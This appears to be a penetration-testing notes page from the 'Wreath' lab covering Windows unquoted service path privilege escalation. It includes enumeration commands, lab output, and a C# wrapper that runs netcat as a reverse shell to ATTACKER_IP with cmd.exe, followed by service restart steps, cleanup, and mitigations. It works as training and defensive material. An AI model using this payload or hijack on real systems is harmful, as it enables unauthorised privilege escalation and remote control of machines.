# Windows Unquoted Service Path

Used on: **Wreath**

An unquoted Windows service path with spaces can be abused when a low-privileged user can write to a directory in the path and can trigger the service.

## Why It Works

When a service path like `C:\Program Files (x86)\Vendor App\Service\service.exe` is unquoted, Windows may try earlier path segments during service start. If an attacker can place an executable in one of those searched locations, it may run as the service account.

## Prerequisites

- Service path contains spaces and is unquoted.
- Writable directory in the search path.
- Ability to start/restart the service, or wait for a reboot/service restart.
- Service runs as a privileged account.

## Enumeration

<!-- cmd: windows -->
```cmd
whoami /priv
whoami /groups
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
sc qc SystemExplorerHelpService
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
```

Wreath showed:

```text
SystemExplorerHelpService  C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
Access : BUILTIN\Users Allow FullControl
```

## Payload

Compile a C# wrapper that launches netcat:

```csharp
using System;
using System.Diagnostics;

namespace Wrapper {
    class Program {
        static void Main() {
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo(
                "c:\\windows\\temp\\nc-try.exe",
                "ATTACKER_IP 4444 -e cmd.exe"
            );
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```

<!-- cmd: linux -->
```bash
mcs Wrapper.cs
```

Place the compiled executable in the vulnerable path and restart the service:

<!-- cmd: windows -->
```cmd
sc stop SystemExplorerHelpService
sc start SystemExplorerHelpService
```

## Cleanup

<!-- cmd: windows -->
```cmd
del "C:\Program Files (x86)\System Explorer\System.exe"
sc start SystemExplorerHelpService
```

## Defensive Note

Quote all service paths, remove write permissions from service directories, and monitor service binary creation under `C:\Program Files*`.

## Related

- [windows-enumeration.md](../enumeration/windows-enumeration.md)
- [../tools/netcat.md](../../tools/pivot/netcat.md)


